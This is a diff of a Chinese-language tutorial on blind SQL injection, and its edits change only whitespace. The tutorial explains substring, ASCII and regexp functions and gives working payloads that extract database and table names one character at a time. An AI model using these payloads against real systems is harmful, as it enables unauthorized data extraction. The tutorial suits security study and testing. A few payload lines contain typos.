@@ -13,6 +13,7 @@ length：可选。要返回的字符数。如果省略，则 MID() 函数返�
 Eg:      str="123456"     mid(str,2,1)    结果为2  
 Sql用例：  
 >（1）MID(DATABASE(),1,1)>’a’,查看数据库名第一位，MID(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。
+
 >（2）MID((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处column_name参数可以为sql语句，可自行构造sql语句进行注入。  
 
  **substr()函数**  
@@ -22,7 +23,7 @@ Sql用例：
 
 参数描述同mid()函数，第一个参数为要处理的字符串，start为开始位置，length为截取的长度。  
 Sql用例：  
->(1) substr(DATABASE(),1,1)>’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。
+>(1) substr(DATABASE(),1,1)>’a’,查看数据库名第一位，substr(DATABASE(),2,1)查看数据库名第二位，依次查看各位字符。  
 >(2) substr((SELECT table_name FROM INFORMATION_SCHEMA.TABLES WHERE T table_schema=0xxxxxxx LIMIT 0,1),1,1)>’a’此处string参数可以为sql语句，可自行构造sql语句进行注入。  
 
 **Left()函数**
@@ -30,13 +31,14 @@ Left()得到字符串左部指定个数的字符
 Left ( string, n )        string为要截取的字符串，n为长度。  
 Sql用例：  
 
->(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。
+>(1) left(database(),1)>’a’,查看数据库名第一位，left(database(),2)>’ab’,查看数据库名前二位。  
 >(2) 同样的string可以为自行构造的sql语句。
 
 同时也要介绍 **ORD()** 函数，此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。
 例如ORD(MID(DATABASE(),1,1))>114 意为检测database()的第一位ASCII码是否大于114，也即是‘r’
-类似的还有**ascii()函数**：
-`ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ `       //substr()函数，ascii()函数  
+类似的还有**ascii()函数**：  
+`ascii(substr((select table_name from information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+ `   
+//substr()函数，ascii()函数  
 Explain：substr(a,b,c)从b位置开始，截取字符串a的c长度。Ascii()将某个字符转换为ascii值  
 **▲ascii(substr((select database()),1,1))=98**  
 **▲regexp正则注入**  
@@ -48,6 +50,6 @@ Explain：正则表达式的用法，user()结果为root，regexp为匹配root�
 
 当正确的时候显示结果为1，不正确的时候显示结果为0.  
 示例介绍：  
->select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));
+>select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));  
 >select * from users where id=1 and 1=(user() regexp'^ri');
 
